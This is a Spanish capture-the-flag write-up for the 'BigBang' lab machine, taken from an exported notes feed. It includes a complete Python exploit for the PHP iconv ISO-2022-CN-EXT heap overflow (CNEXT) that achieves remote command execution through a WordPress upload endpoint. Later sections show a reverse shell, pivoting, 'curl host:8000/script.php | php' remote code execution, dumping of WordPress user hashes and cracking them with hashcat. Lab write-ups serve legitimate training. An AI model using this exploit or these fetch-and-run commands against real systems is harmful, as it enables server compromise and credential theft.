<br><br>Los filtros (como string.upper) se aplican a las cubetas uno por uno:<br>
<br>PHP procesa cada cubeta, asignando un búfer de salida del mismo tamaño que el búfer de entrada.
<br>Por ejemplo, si el filtro es string.upper, los caracteres minúsculos en el búfer de entrada se convierten a mayúsculas en el búfer de salida.
<br>Se crea una nueva cubeta para los datos procesados.
<br><br>Una vez que se procesa una cubeta con un filtro, se crea una nueva brigada de cubetas con los resultados. El siguiente filtro se aplica a esta nueva brigada. Este proceso continúa hasta que todos los filtros se han aplicado.<br>Este mecanismo introduce potenciales vulnerabilidades:<br>
<br>Los filtros procesan datos en bloques, lo que los hace susceptibles a desbordamientos de búfer si las verificaciones de tamaño son insuficientes.
<br>Las cadenas de filtros aumentan la complejidad, permitiendo a los atacantes crear payloads intrincados.
<br><br><br>Nuestro objetivo es aprovechar la vulnerabilidad de desbordamiento de búfer en el filtro convert.iconv.XXX.ISO-2022-CN-EXT para lograr ejecución remota de código (RCE).<br><br>Con la explotación anterior, obtenemos la capacidad de leer archivos arbitrarios. Esto nos permite:<br>
<br>Leer binaries críticos como PHP, Apache y bibliotecas compartidas (ejemplo: libc) para análisis.
<br>Filtrar la distribución de memoria (/proc/self/maps) para revelar la disposición de la memoria del proceso en ejecución. Esto evita ASLR (Randomización del Espacio de Direcciones) y PIE (Ejecutables Independientes de Posición).
<br><br>A través del abuso de las cubetas, podemos asignar y liberar búferes casi arbitrariamente:<br>
<br>Usar zlib.inflate para crear múltiples cubetas.
<br>Redimensionar las cubetas con dechunk para alinearlas con los tamaños de bloques en el montón (por ejemplo, 0x100).
<br>Manipular la lista libre mediante la asignación, liberación y sobrescritura de punteros.
<br><br>Esta técnica permite manipular las cubetas de manera precisa para preparar la explotación (pon que las cubetas son muñequitas rusas ):<br>
<br>Lograr control total sobre qué escribir y dónde (write-what-where).
<br>Ejecutar comandos arbitrarios.
<br><br><br>
<br>
Solicitud 1 : Leer /proc/self/maps para filtrar:

<br>La disposición de memoria del proceso PHP (incluyendo la dirección del montón).
<br>La dirección base de libc para usar técnicas ROP.


<br>
Solicitud 2 : Descargar la versión coincidente de libc para extraer la dirección de la función system() y habilitar la ejecución de comandos arbitrarios con system('/bin/sh').

<br>
Solicitud 3 : Ejecutar el payload final:

<br>Desencadenar el desbordamiento.
<br>Manipular el montón.
<br>Ejecutar el comando.


<br><br><br>
<br>Implementa métodos para enviar solicitudes HTTP POST al endpoint vulnerable.
<br>Usa la cadena de filtros chain_prefix (los que usamos con wrapwrap) para engañar al sistema en la interpretación de datos.
<br>Permite descargar archivos remotos utilizando técnicas como php://filter.
<br>
<br>
check_vulnerable:

<br>Comprueba si los wrappers data://, php://filter y la extensión zlib están habilitados.
<br>Si alguno de estos no está disponible, el exploit no funcionará.


<br>
get_symbols_and_addresses:

<br>Lee el archivo /proc/self/maps para obtener las regiones de memoria del proceso PHP.
<br>Busca la dirección base de libc y el montón (heap) en la memoria.
<br>Descarga una copia local de libc.so.6 para analizar símbolos y direcciones específicas.


<br>
build_exploit_path:

<br>Construye el payload malicioso que explotará la vulnerabilidad.
<br>

<br>Creación de bloques (buckets) personalizados.
<br>Manipulación del heap mediante técnicas como dechunk y convert.iconv.
<br>Sobrescritura del puntero free_slot para controlar la asignación de memoria.




<br>
exploit:

<br>Envía el payload final al servidor objetivo.
<br>Espera un tiempo configurado (sleep) para verificar si el exploit fue exitoso.


<br><br>La clase Exploit es la parte principal del script. Contiene toda la lógica necesaria para construir y enviar el payload malicioso.<br><br>
<br>
check_vulnerable:

<br>Verifica si el sistema objetivo es vulnerable.
<br>Comprueba si los wrappers data://, php://filter y la extensión zlib están habilitados.
<br>Si alguno de estos no está disponible, el exploit no funcionará.


<br>
get_symbols_and_addresses:

<br>Lee el archivo /proc/self/maps para obtener las regiones de memoria del proceso PHP.
<br>Busca la dirección base de libc y el montón (heap) en la memoria.
<br>Descarga una copia local de libc.so.6 para analizar símbolos y direcciones específicas.


<br>
build_exploit_path:

<br>Construye el payload malicioso que explotará la vulnerabilidad.
<br>Utiliza técnicas avanzadas como:

<br>Creación de bloques (buckets) personalizados.
<br>Manipulación del montón mediante técnicas como dechunk y convert.iconv.
<br>Sobrescritura del puntero free_slot para controlar la asignación de memoria.




<br>
exploit:

<br>Envía el payload final al servidor objetivo.
<br>Espera un tiempo configurado (sleep) para verificar si el exploit fue exitoso.


<br>
from __future__ import annotations

import base64
import urllib.parse
import zlib
import urllib

from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError

from pwn import *
from ten import *


HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")


class Remote:

    def __init__(self, url: str) -&gt; None:
        self.url = url
        self.session = Session()

    def send(self, path: str) -&gt; Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """

        data = {'action' : 'upload_image_from_url',
                'url' : urllib.parse.quote_plus('php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource='+path),
                'id' : '1',
                'accepted_files' : 'image/gif'}
        return self.session.post(self.url, data=data)


    def send_exploit(self, payload: bytes) -&gt; Response:
        """Sends the payload to the server.
        """
        data = {'action' : 'upload_image_from_url',
                'url' : urllib.parse.quote_plus(payload),
                'id' : '1',
                'accepted_files' : 'image/gif'}
        return self.session.post(self.url, data=data)
        
    def download(self, path: str) -&gt; bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        file_path = self.send(path).json()['response']
        
        if 'File type' in file_path:
            print(file_path)
            return b''
        
        response = self.session.get(file_path)
        data = response.content[6:]
        return data

    def data_decode(self, data:bytes)-&gt;bytes:
        data = data.decode('latin-1')
        return base64.decode(data + (4 - len(data) % 4) * '=')

@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)

    def check_vulnerable(self) -&gt; None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """
        
        def safe_download(path: str) -&gt; bytes:
            try:
                return self.remote.download(path)
            except ConnectionError:
                failure("Target not [b]reachable[/] ?")
            

        def check_token(text: str, path: str) -&gt; bool:
            result = safe_download(path)

            return len(set(result).intersection(set(text.encode()))) &gt; 0

        text = tf.random.string(50).encode()
        base64 = b64(b'GIF89a' + text, misalign=True).decode()
        path = f"data:text/plain;base64,{base64}"
        
        result = safe_download(path)
        
        if len(set(result).intersection(set(text))) == 0:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")

        msg_info("The [i]data://[/] wrapper works")

        text = 'GIF89a' + tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]php://filter/[/] wrapper does not work")

        msg_info("The [i]php://filter/[/] wrapper works")

        text = 'GIF89a' + tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"

        if not check_token(text, path):
            failure("The [i]zlib[/] extension is not enabled")

        msg_info("The [i]zlib[/] extension is enabled")

        msg_success("Exploit preconditions are satisfied")

    def get_file(self, path: str) -&gt; bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)

    def get_regions(self) -&gt; list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.remote.data_decode(self.get_file("/proc/self/maps"))
        
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                failure("Unable to parse memory mappings")

        self.log.info(f"Got {len(regions)} memory regions")

        return regions

    def get_symbols_and_addresses(self) -&gt; None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()

        LIBC_FILE = "./libc.so.6"

        # PHP's heap

        self.info["heap"] = self.heap or self.find_main_heap(regions)
        print(f'HEAP address: {hex(self.info["heap"])}')

        # Libc

        libc = self._get_region(regions, "libc-", "libc.so")

        #self.download_file(libc.path, LIBC_FILE)

        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        print(f'LIBC address: {hex(libc.start)}')
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -&gt; Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")

        return region

    def download_file(self, remote_path: str, local_path: str) -&gt; None:
        """Downloads `remote_path` to `local_path`"""
        data = self.remote.data_decode(self.get_file(remote_path))
        Path(local_path).write(data)

    def find_main_heap(self, regions: list[Region]) -&gt; Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size &gt;= HEAP_SIZE
            and region.stop &amp; (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:zend_alloc]")
        ]

        if not heaps:
            failure("Unable to find PHP's main heap in memory")

        first = heaps[0]

        if len(heaps) &gt; 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using last one)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")

        return first

    def run(self) -&gt; None:
        #self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -&gt; str:

        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"\x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"\x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"

        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS

        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # This chunk will eventually overwrite mm_heap-&gt;free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"\x00"

        assert (
            len(COMMAND) &lt;= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )

        resource = compress(compress(pages))
        resource = b64(resource) #b64(pages) 
        resource = f"data:text/plain;base64,{resource.decode()}"

        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
            
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
            
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"

        return path

    @inform("Triggering...")
    def exploit(self) -&gt; None:
        path = self.build_exploit_path()
        start = time.time()

        try:
            msg_print("Sending exploit...")
            print(f'PATH: {path}')

            self.remote.send_exploit(path)
        except (ConnectionError, ChunkedEncodingError):
            pass
        
        msg_print()
        
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep &lt;= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
        
        msg_print()


def compress(data) -&gt; bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]


def b64(data: bytes, misalign=True) -&gt; bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()


def compressed_bucket(data: bytes) -&gt; bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)


def qpe(data: bytes) -&gt; bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()


def ptr_bucket(*ptrs, size=None) -&gt; bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket


def chunked_chunk(data: bytes, size: int = None) -&gt; bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"


@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -&gt; int:
        return self.stop - self.start


Exploit()
<br><img alt="Pasted image 20250202210905.png" src="machines/bigbang/imgs/pasted-image-20250202210905.png"><br><br>]]></description><link>machines/bigbang/01-recon.html</link><guid isPermaLink="false">Machines/BigBang/01-Recon.md</guid><pubDate>Wed, 05 Feb 2025 16:15:20 GMT</pubDate><enclosure url="machines/bigbang/imgs/pasted-image-20250131121917.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/bigbang/imgs/pasted-image-20250131121917.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[User www-data]]></title><description><![CDATA[ 
 <br><br><br>Al estar en un contenedor no tenemos comandos como ss ni netstat pero si wget<br><br>www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$ cat /proc/net/tcp
cat /proc/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode                                                                                                        
   0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 37202 1 0000000000000000 100 0 0 10 0                                                                        
   1: 030011AC:9A3C 2A100A0A:115C 01 00000000:00000000 00:00000000 00000000    33        0 84716 1 0000000000000000 566 4 30 10 24                                                                      
   2: 030011AC:9CD6 010011AC:0CEA 01 00000000:00000000 02:0009B676 00000000    33        0 368393 2 0000000000000000 20 4 17 10 -1                                                                      
   3: 030011AC:E4A8 010011AC:0CEA 01 00000000:00000000 02:000300EF 00000000    33        0 85383 2 0000000000000000 20 4 1 10 -1                                                                        
   4: 030011AC:A3B0 400E0A0A:115C 01 00000012:00000000 01:00000024 00000000    33        0 368396 3 0000000000000000 36 4 30 10 -1             
<br><br><br><br>Conexion 1<br>0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 37202 1 0000000000000000 100 0 0 10 0
<br>
<br>Local Address (00000000:0050) :

<br>IP: 0.0.0.0 (escucha en todas las interfaces).
<br>Puerto: 0x0050 = 80 (HTTP).


<br>Remote Address (00000000:0000) :

<br>IP: 0.0.0.0 (sin conexión remota).
<br>Puerto: 0 (ningún puerto remoto asignado).


<br>Estado (0A) : Estado LISTEN (esperando conexiones entrantes).
<br>UID : 0 (proceso pertenece al usuario root o sistema).
<br>Descripción : Esta es una conexión HTTP que está escuchando en el puerto 80. (el blog)
<br>Conexion 2<br>1: 030011AC:9A3C 2A100A0A:115C 01 00000000:00000000 00:00000000 00000000    33        0 84716 1 0000000000000000 566 4 30 10 24
<br>
<br>Local Address (030011AC:9A3C) :

<br>IP: 192.168.0.3 (convertido de 030011AC).
<br>Puerto: 0x9A3C = 39484.


<br>Remote Address (2A100A0A:115C) :

<br>IP: 10.16.42.42 (convertido de 2A100A0A).
<br>Puerto: 0x115C = 4444.


<br>Estado (01) : Estado ESTABLISHED (conexión activa).
<br>UID : 33 (generalmente el usuario www-data en sistemas web).
<br>Descripción : Una conexión establecida desde 192.168.0.3:39484 hacia 10.16.42.42:4444. (nuestra rev-shell)
<br>Conexion 3 <br>2: 030011AC:9CD6 010011AC:0CEA 01 00000000:00000000 02:0009B676 00000000    33        0 368393 2 0000000000000000 20 4 17 10 -1
<br>
<br>Local Address (030011AC:9CD6) :

<br>IP: 192.168.0.3.
<br>Puerto: 0x9CD6 = 39958.


<br>Remote Address (010011AC:0CEA) :

<br>IP: 192.168.0.1.
<br>Puerto: 0x0CEA = 3306 (puerto MySQL).


<br>Estado (01) : Estado ESTABLISHED.
<br>UID : 33 (usuario www-data).
<br>Descripción : Una conexión establecida desde 192.168.0.3:39958 hacia 192.168.0.1:3306 (base de datos MySQL de la cual ya tenemos credenciales (wp-config.php de recon).
<br>Conexion 4<br>3: 030011AC:E4A8 010011AC:0CEA 01 00000000:00000000 02:000300EF 00000000    33        0 85383 2 0000000000000000 20 4 1 10 -1
<br>
<br>Local Address (030011AC:E4A8) :

<br>IP: 192.168.0.3.
<br>Puerto: 0xE4A8 = 58536.


<br>Remote Address (010011AC:0CEA) :

<br>IP: 192.168.0.1.
<br>Puerto: 0x0CEA = 3306 (MySQL).


<br>Estado (01) : Estado ESTABLISHED.
<br>UID : 33 (usuario www-data).
<br>Descripción : Otra conexión hacia la base de datos MySQL en 192.168.0.1:3306.
<br>Conexion 5<br>4: 030011AC:A3B0 400E0A0A:115C 01 00000012:00000000 01:00000024 00000000    33        0 368396 3 0000000000000000 36 4 30 10 -1
<br>
<br>Local Address (030011AC:A3B0) :

<br>IP: 192.168.0.3.
<br>Puerto: 0xA3B0 = 41872.


<br>Remote Address (400E0A0A:115C) :

<br>IP: 10.14.10.64.
<br>Puerto: 0x115C = 4444.


<br>Estado (01) : Estado ESTABLISHED.
<br>UID : 33 (usuario www-data).
<br>Descripción : Una conexión establecida desde 192.168.0.3:41872 hacia 10.14.10.64:4444.
<br><br><br>Vamos a usar ligolo-ng para hacer pivoting creando un puente entre la maquina y nuestro host:<br> ligolo en vez de usar un SOCKS proxy o TCP/UDP fowarding, Ligolo-ng crea un userland network stack usando  <a data-tooltip-position="top" aria-label="https://gvisor.dev/" rel="noopener nofollow" class="external-link" href="https://gvisor.dev/" target="_blank">Gvisor</a>.<br>Esta herramienta nos permite pivotar en la maquina de forma muchisimo mas rapida de lo que podria hacer chisel o meterpreter<br>Subimos a la máquina victima (derecha) el agent y desde el host (izquierda) ajustamos el proxy; Una vez establecido el tunel podemos ver que tenemos conexión con el puerto 3306 de la victima (mysql)<br>
<img alt="Pasted image 20250203003144.png" src="machines/bigbang/imgs/pasted-image-20250203003144.png"><br>Probamos a conectarnos al mysql :<br>Intento conectarme al servidor de mysql sin exito<br>
<img alt="Pasted image 20250203003751.png" src="machines/bigbang/imgs/pasted-image-20250203003751.png"><br>
Aun con el tunel establecido no soy capaz de entablar la conexion; eso significa que o bien el mysql no esta corriendo (no es el caso) o tiene un cortafuegos.<br>La maquina victima (dockerizada) no tiene el binario mysql pero si que sabemos que tiene php por lo que podemos intentar entrar en la base de datos mediante un script ;<br>&lt;?php
$host = '172.17.0.1';
$user = 'wp_user';
$pass = 'wp_password';
$db = 'wordpress';

$conn = new mysqli($host, $user, $pass, $db);

if ($conn-&gt;connect_error) {
    die("Connection failed: " . $conn-&gt;connect_error);
}
echo "Connected successfully\n";

$result = $conn-&gt;query("SHOW TABLES");
while ($row = $result-&gt;fetch_row()) {
    echo $row[0] . "\n";
}
$conn-&gt;close();
?&gt;
<br>www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$ curl 10.10.14.64:8000/trythis.php | php
&lt;s/wp-admin$ curl 10.10.14.64:8000/trythis.php | php    
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   379  100   379    0     0   1041      0 --:--:-- --:--:-- --:--:--  1044
Connected successfully
wp_commentmeta
wp_comments
wp_links
wp_options
wp_postmeta
wp_posts
wp_term_relationships
wp_term_taxonomy
wp_termmeta
wp_terms
wp_usermeta
wp_users
www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$ 
<br>Bingo!<br>sacamos los datos de la tabla wp_users:<br>&lt;?php
$host = '172.17.0.1';
$user = 'wp_user';
$pass = 'wp_password';
$db = 'wordpress';


$conn = new mysqli($host, $user, $pass, $db);


if ($conn-&gt;connect_error) {
    die("Connection failed: " . $conn-&gt;connect_error);
}
echo "Connected successfully\n";


$query = "SELECT * FROM wp_users";
$result = $conn-&gt;query($query);

// Verificar si hay resultados
if ($result-&gt;num_rows &gt; 0) {
    // Iterar sobre cada fila de la tabla wp_users
    while ($row = $result-&gt;fetch_assoc()) {
        // Imprimir todas las columnas de la fila
        foreach ($row as $key =&gt; $value) {
            echo "$key: $value\n";
        }
        echo "------------------------\n"; // Separador entre usuarios
    }
} else {
    echo "No se encontraron registros en la tabla wp_users.\n";
}


$conn-&gt;close();
?&gt;
<br>voi là !<br>www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$ curl 10.10.14.64:8000/wp_users.php | php
&lt;/wp-admin$ curl 10.10.14.64:8000/wp_users.php | php    
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   963  100   963    0     0   4125      0 --:--:-- --:--:-- --:--:--  4133
Connected successfully
ID: 1
user_login: root
user_pass: $P$Beh5HLRUlTi1LpLEAstRyXaaBOJICj1
user_nicename: root
user_email: root@bigbang.htb
user_url: http://blog.bigbang.htb
user_registered: 2024-05-31 13:06:58
user_activation_key: 
user_status: 0
display_name: root
------------------------
ID: 3
user_login: shawking
user_pass: $P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./
user_nicename: shawking
user_email: shawking@bigbang.htb
user_url: 
user_registered: 2024-06-01 10:39:55
user_activation_key: 
user_status: 0
display_name: Stephen Hawking
------------------------

<br>Bueno a crackear esas passwords!<br>➜  BigBang hashcat --identify shawkinghash 
The following hash-mode match the structure of your input hash:
      # | Name                                                       | Category
  ======+============================================================+======================================
    400 | phpass                                                     | Generic KDF
<br><br><br>Crackeamos el el phpass<br>
hashcat -a 0 -m 400 shawkinghash /usr/share/wordlists/rockyou.txt

$P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./:quantumphysics         
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 400 (phpass)
Hash.Target......: $P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./
Time.Started.....: Mon Feb  3 20:49:54 2025 (12 mins, 36 secs)
Time.Estimated...: Mon Feb  3 21:02:30 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     5901 H/s (10.65ms) @ Accel:256 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4456448/14344385 (31.07%)
Rejected.........: 0/4456448 (0.00%)
Restore.Point....: 4454400/14344385 (31.05%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:7936-8192
Candidate.Engine.: Device Generator
Candidates.#1....: quaqua8 -&gt; qu956421
Hardware.Mon.#1..: Temp: 82c Util: 89%

Started: Mon Feb  3 20:49:51 2025
Stopped: Mon Feb  3 21:02:31 2025

<br>Usamos esa clave para conectarnos por ssh a la maquina y el usuario shawking<br>]]></description><link>machines/bigbang/02-exploitation.html</link><guid isPermaLink="false">Machines/BigBang/02-exploitation.md</guid><pubDate>Wed, 05 Feb 2025 16:16:06 GMT</pubDate><enclosure url="machines/bigbang/imgs/pasted-image-20250203003144.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/bigbang/imgs/pasted-image-20250203003144.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[03-User-Shawking]]></title><description><![CDATA[ 
